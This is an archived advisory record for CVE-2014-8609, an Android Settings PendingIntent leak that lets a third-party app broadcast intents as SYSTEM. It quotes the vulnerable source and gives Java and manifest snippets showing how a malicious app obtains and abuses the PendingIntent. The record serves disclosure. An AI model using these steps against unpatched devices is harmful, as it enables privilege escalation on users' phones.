{
    "text": "title : Android Settings Pendingintent Leak  ， detail : In Android versions prior to 5.0 and possibly greater than and equal to 4.0 , Settings application leaks Pendingintent with a blank base intent ( neither the component nor the action is explicitly set ) to third party applications. Due to this , a malicious app can use this to broadcast intent with the same permissions and identity of the Settings application , which runs as SYSTEM uid.  ， cve : advisories | CVE-2014-8609  ，  ， desc : INTRODUCTION  ，  ， In Android <5.0 ( and maybe >= 4.0 )  , Settings application leaks Pendingintent with a blank base intent ( neither the component nor the action is explicitly set ) to third party application , bad app can use this to broadcast intent with the same permissions and identity of the Settings application , which runs as SYSTEM uid. Thus bad app can broadcast sensitive intent with the permission of SYSTEM.  ， DETAILS  ，  ， The vulnerability exists in the AddAccountSettings.java in the Settings app :   ， https : /android.googlesource.com/platform/packages/apps/Settings/+/android-4.4.4_r2.0.1/src/com/android/settings/accounts/AddAccountSettings.java  ， In the method addAccount , a PendingIntent is created by getBroadcast , the problem here is both the action and the component are not explicitly set :   ， private void addAccount ( String accountType ) {  ， Bundle addAccountOptions = new Bundle (  )  ;   ， mPendingIntent = PendingIntent.getBroadcast ( this , 0 , new Intent (  )  , 0 )  ;   ， addAccountOptions.putParcelable ( KEY_CALLER_IDENTITY , mPendingIntent )  ;   ， addAccountOptions.putBoolean ( EXTRA_HAS_MULTIPLE_USERS , Utils.hasMultipleUsers ( this )  ;   ， AccountManager.get ( this ) .addAccount (   ， accountType ,   ， null , / * authTokenType * /  ， null , / * requiredFeatures * /  ， addAccountOptions ,   ， null ,   ， mCallback ,   ， null / * handler * / )  ;   ， mAddAccountCalled = true ;   ， }  ， This PendingIntent is then stored in the addAccountOptions , which will be sent to another application.  ， According to android developer guides , this is not secure :  ( see http : /developer.android.com/reference/android/app/PendingIntent.html )   ， \"By giving a PendingIntent to another application , you are granting it the right to perform the operation you have specified as if the other application was yourself ( with the same permissions and identity ) . As such , you should be careful about how you build the PendingIntent : almost always , for example , the base Intent you supply should have the component name explicitly set to one of your own components , to ensure it is ultimately sent there and nowhere else.\"  ， The bad app can register as an account authenticator by writing a service with the following intent filter ( no permission is needed )  :   ， <intent-filter>  ， <action android : name=\"android.accounts.AccountAuthenticator\" />  ， </intent-filter>  ， Then bad app can send an intent to Settings app and request Settings app to add account of requested account type :   ， Intent intent = new Intent (  )  ;   ， intent.setComponent ( new ComponentName ( \"com.android.settings\" , \"com.android.settings.accounts.AddAccountSettings\" )  ;   ， intent.setAction ( Intent.ACTION_RUN )  ;   ， intent.setFlags ( Intent.FLAG_ACTIVITY_NEW_TASK )  ;   ， String authTypes [  ] = {AccountGeneral.ACCOUNT_TYPE} ;   ， intent.putExtra ( \"account_types\" , authTypes )  ;   ， startActivity ( intent )  ;   ， Upon receiving such an intent , Settings app will ( automatically ) call the method addAccount ( whose vulnerability is explained as above ) and sent the pendingIntent to bad app's addAccount method.  ， Since the pendingIntent's actions and components are blank , bad app can fillin arbitrary action and extra information into this intent and resending this pending intent , with the permission of SYSTEM.",
    "time": "Nov 26, 2014"
}